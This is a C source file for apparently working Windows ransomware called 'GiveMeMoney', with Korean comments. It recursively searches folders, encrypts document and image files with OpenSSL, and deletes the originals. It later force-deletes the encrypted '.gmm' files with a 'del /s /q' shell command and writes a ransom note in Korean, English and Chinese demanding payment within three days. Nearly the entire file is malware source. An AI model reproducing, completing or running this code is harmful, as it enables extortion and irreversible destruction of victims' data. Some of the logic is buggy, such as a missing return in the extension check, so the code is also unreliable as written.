#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <io.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <tchar.h>
#include "file.h"
#include <locale.h>

int cnt = 0;
_finddata_t fd;
char* TargetExtension[5] = { ".hwp", ".docx", ".png", ".txt", ".jpg" };

int Encrypt(FILE *inFp, FILE *outFp, const EVP_CIPHER *cipher,
	const unsigned char *key, const unsigned char *iv)
{
	int inLen, outLen;		// inLen:입력된 데이터의 길이, outLen:출력된 데이터의 길이
	unsigned char inBuf[BUFSIZ], outBuf[BUFSIZ + EVP_MAX_BLOCK_LENGTH];	// inBuf:입력 데이터 버퍼, outBuf:출력 데이터 버퍼
	EVP_CIPHER_CTX *ctx;		// 암호화 수행에 사용할 context

							// 1. context 초기화
	ctx = EVP_CIPHER_CTX_new();
	//EVP_CIPHER_CTX_init(ctx);

	// 2. 암호화 초기 설정.
	// - context, 암호 알고리즘, 키 값, IV 값 설정
	EVP_EncryptInit_ex(ctx, cipher, NULL, key, iv);

	// 3. 데이터 암호화
	while ((inLen = fread(inBuf, 1, sizeof(inBuf), inFp)) > 0)		// 입력 파일에서 BUFSIZ만큼 데이터를 read
	{
		if (!EVP_EncryptUpdate(ctx, outBuf, &outLen, inBuf, inLen))		// read된 데이터를 암호화
		{
			printf("EVP_EncryptUpdate() error.\n");
			EVP_CIPHER_CTX_cleanup(ctx);
			return -1;
		}
		fwrite(outBuf, 1, outLen, outFp);		// 출력 파일에 암호화된 데이터를 write
	}

	// 4. 암호화의 마지막 처리, e.g. 패딩 처리
	if (!EVP_EncryptFinal_ex(ctx, outBuf, &outLen))
	{
		printf("EVP_EncryptFinal_ex() error.\n");
		EVP_CIPHER_CTX_cleanup(ctx);
		return -2;
	}
	fwrite(outBuf, 1, outLen, outFp);			// 출력 파일에 마지막으로 암호화된(패딩 처리된) 데이터를 write

	EVP_CIPHER_CTX_cleanup(ctx);			// context 초기화
	return 0;
}

// int isFileorDir()
// 폴더 / 파일 여부 확인하여 결과값 반환

int isFileOrDir()
{
	if (fd.attrib & _A_SUBDIR)
		return 0; // 디렉토리면 0 반환
	else
		return 1; // 그밖의 경우는 "존재하는 파일"이기에 1 반환
}

// int isTarget(char* file_extension)
// 확장자 비교하는 방식으로 암호화 대상 확인

int isTarget(char* fileExtension)
{
	for (int i = 0; i < sizeof(TargetExtension) / sizeof(char*); i++)
	{
		if (strcmp(fileExtension, TargetExtension[i]) == 0) { return 1; }
	}
}

void SearchFile(char path[], const EVP_CIPHER *cipher, int mode, unsigned char *key, unsigned char *iv)
{
	int isFile = 0;
	char newPath[_MAX_PATH];
	FILE *inFp, *outFp;
	strcpy(newPath, path);
	strcat(newPath, fd.name);

	char outputFile[_MAX_PATH] = {};

	isFile = isFileOrDir();    //파일인지 디렉토리 인지 식별
	//확장자 써치 분기문
	
		if (isFile == 0 && fd.name[0] != '.') {
			SearchFile(newPath, cipher, mode, key, iv);    //하위 디렉토리 검색 재귀함수
		}
		else if (isFile == 1 && fd.size != 0 && fd.name[0] != '.' && isTarget(_strlwr(strrchr(fd.name, '.'))) == 1) {

			if ((inFp = fopen(newPath, "rb")) == NULL)
				exit(4);

			strcpy(outputFile, newPath);
			strcat(outputFile, ".gmm");

			if ((outFp = fopen(outputFile, "wb")) == NULL)
				exit(5);

			if (Encrypt(inFp, outFp, cipher, key, iv) < 0)
				exit(6);

			fclose(inFp);
			fclose(outFp);

			remove(newPath);
		}

}

int DeleteExpired(char *path) {
	Sleep(180000);              // Delay 1Hour [1000 = 1sec] 
	//Sleep(10000);                  // test code
	// system("Dir");               // TEST CMD

	char *s1 = "del /s /q \"";
	char *s2 = "*.gmm\"";
	char *command = (char *)malloc(sizeof(char) * 100);
	strcpy(command, s1);
	strcat(command, path);
	strcat(command, s2);


	system(command);   				// s:지정 파일을 하위디렉토리에서 모두삭제
									// q: 삭제확인 메세지 없이 강제삭제+ [f: 읽기파일 강제삭제?]
	system("cls");                  // CMD clear
	system("EXIT");                 // CMD Cancel
	return 0;
}

void CreateNote() {
	setlocale(LC_ALL, "");
	wchar_t *note = L"************------______GiveMeMoney______------************\n\n귀하의 중요한 파일이 암호화 됩니다.\n문서, 사진, 비디오, 데이터베이스 및 기타 파일은 암호화 되어있어 더 이상 엑세스 할 수 없습니다. 파일을 복구 할 수 있는 방법을 찾느라 시간을 낭비하지 않아도 됩니다. 누구도 암호 해독 서비스 없이 파일을 복구 할 수 없습니다.\n\n확실하게 모든 파일을 안전하고 쉽게 복구 할 수 있습니다. 일부 파일은 무료로 해독 할 수 있습니다. 그러나 모든 파일의 암호를 해독하려면 돈을 지불해야합니다. 돈을 지불하는 데는 3일 밖에 남지 않았습니다. 그 후 가격이 배가 됩니다. 돈을 지불하여 파일을 복구하십시오.\n\n---------------------------------------------------------------------\n\nYour important files will be encrypted.\nDocuments, photos, videos, databases, and other files are encrypted and cannot be accessed anymore. You don\'t have to waste time finding ways to recover files. No one can recover files without decryption.\n\nRecover all your files securely and easily. Some files can be decrypted free of charge. However, you will have to pay to decrypt all files. There are only three days left to pay. After that, the price will double. Pay the money to recover the files.\n\n---------------------------------------------------------------------\n\n你的重要文件将被加密。\n文件,照片,视频,数据库和其他文件被加密,不能再访问。你不必浪费时间找寻文件的方法。 没有解密,任何人都不能恢复文件。\n\n妥善地取回所有档案。 有些文件可以免费解密。 然而,你必须付钱去解密所有文件。只剩下三天时间付钱了。 之后,价格会翻番。 付钱去取回文件。\n\n\n\n";

	FILE *inFp;
	inFp = _wfopen(L"C:\\Users\\gmm\\Desktop\\ransomnote.txt", L"w+ccs=UTF-8");

	fwrite(note, sizeof(WCHAR), wcslen(note), inFp);
	fclose(inFp);
}